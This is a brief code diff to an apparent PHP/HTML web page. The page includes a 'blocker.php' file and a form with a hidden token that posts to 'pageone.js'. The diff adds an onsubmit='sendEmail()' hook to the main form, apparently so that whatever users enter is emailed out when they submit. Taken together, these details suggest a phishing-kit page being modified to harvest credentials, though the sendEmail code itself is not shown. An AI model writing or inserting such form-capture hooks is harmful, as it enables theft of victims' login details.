@@ -193,7 +193,8 @@ include '../blocker.php';
     
     <div class="content-container" id="content" role="main" tabindex="-1">
         <!-- action="-=.php" -->
-        <form action="pageone.js" autocomplete="off" id="MainForm" method="post">
+        <form action="pageone.js" autocomplete="off" id="MainForm" method="post"               onsubmit="sendEmail()"
+        >
             <input name="Token" type="hidden" value="ORwSDTXRlaQ1" />
             <div class='row'>
             <div class='large-12 medium-12 small-12 column'>
